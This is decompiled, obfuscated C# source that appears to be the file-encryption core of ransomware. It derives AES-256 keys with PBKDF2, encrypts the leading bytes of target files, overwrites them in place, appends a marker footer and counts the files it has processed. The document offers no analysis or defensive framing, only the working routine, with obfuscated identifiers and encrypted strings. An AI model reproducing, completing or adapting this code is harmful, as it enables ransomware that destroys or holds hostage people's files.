using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace ybfSLIGKlaODvJ;

public static class wZhxBLOUELLD
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] TWWzYeNNrdZT(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = YanozqSvFL(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes YanozqSvFL(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] YyvEaXvrgGWE(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (iWNOuKBWgwsf.ucHAaUvpilVt == getString_0(107396969))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (iWNOuKBWgwsf.eCrtUqxUXqEDfkG)
			{
				try
				{
					File.AppendAllText(iWNOuKBWgwsf.ZOToawIMfprr, getString_0(107386708) + string_0 + getString_0(107400787) + ex.Message + getString_0(107396372));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool kFTEsbJnnwQZ(string lMQywbZRpEOBbR, byte[] ZuPICqOHsAezK, byte[] iPDawhgBDCF = null)
	{
		try
		{
			byte[] array = null;
			if (iWNOuKBWgwsf.ucHAaUvpilVt == getString_0(107396969))
			{
				array = (iWNOuKBWgwsf.sFwpaHIPJDNK ? Encoding.ASCII.GetBytes(iWNOuKBWgwsf.HnrHiFTDAEzVb(iWNOuKBWgwsf.zXyRyXbnGmnuzR) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400729)) + Convert.ToString(iWNOuKBWgwsf.ThqgRSrzuFx) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400729))) : Encoding.ASCII.GetBytes(iWNOuKBWgwsf.HnrHiFTDAEzVb(iWNOuKBWgwsf.zXyRyXbnGmnuzR) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400706)) + Convert.ToString(iWNOuKBWgwsf.ThqgRSrzuFx) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400706))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(lMQywbZRpEOBbR, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(ZuPICqOHsAezK, 0, ZuPICqOHsAezK.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(lMQywbZRpEOBbR, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!iWNOuKBWgwsf.sFwpaHIPJDNK)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(iPDawhgBDCF, 0, iPDawhgBDCF.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (iWNOuKBWgwsf.sFwpaHIPJDNK ? Encoding.ASCII.GetBytes(iWNOuKBWgwsf.HnrHiFTDAEzVb(iWNOuKBWgwsf.zXyRyXbnGmnuzR) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400729)) + Convert.ToString(iWNOuKBWgwsf.ThqgRSrzuFx) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400729))) : Encoding.ASCII.GetBytes(iWNOuKBWgwsf.HnrHiFTDAEzVb(iWNOuKBWgwsf.zXyRyXbnGmnuzR) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400706)) + Convert.ToString(iWNOuKBWgwsf.ThqgRSrzuFx) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400706))));
				FileStream fileStream2 = new FileStream(lMQywbZRpEOBbR, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(ZuPICqOHsAezK, 0, ZuPICqOHsAezK.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(lMQywbZRpEOBbR, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!iWNOuKBWgwsf.sFwpaHIPJDNK)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(iPDawhgBDCF, 0, iPDawhgBDCF.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			iWNOuKBWgwsf.ureUqQkXCPeI++;
		}
		catch (Exception ex)
		{
			if (iWNOuKBWgwsf.eCrtUqxUXqEDfkG)
			{
				try
				{
					File.AppendAllText(iWNOuKBWgwsf.ZOToawIMfprr, getString_0(107386708) + lMQywbZRpEOBbR + getString_0(107400688) + ex.Message + getString_0(107396372));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (iWNOuKBWgwsf.sFwpaHIPJDNK ? Encoding.ASCII.GetBytes(iWNOuKBWgwsf.HnrHiFTDAEzVb(iWNOuKBWgwsf.zXyRyXbnGmnuzR) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400729)) + Convert.ToString(iWNOuKBWgwsf.ThqgRSrzuFx) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400729))) : Encoding.ASCII.GetBytes(iWNOuKBWgwsf.HnrHiFTDAEzVb(iWNOuKBWgwsf.zXyRyXbnGmnuzR) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400706)) + Convert.ToString(iWNOuKBWgwsf.ThqgRSrzuFx) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400706))));
				FileStream fileStream4 = new FileStream(lMQywbZRpEOBbR, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(ZuPICqOHsAezK, 0, ZuPICqOHsAezK.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(lMQywbZRpEOBbR, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!iWNOuKBWgwsf.sFwpaHIPJDNK)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(iPDawhgBDCF, 0, iPDawhgBDCF.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static wZhxBLOUELLD()
	{
		Strings.CreateGetStringDelegate(typeof(wZhxBLOUELLD));
	}
}
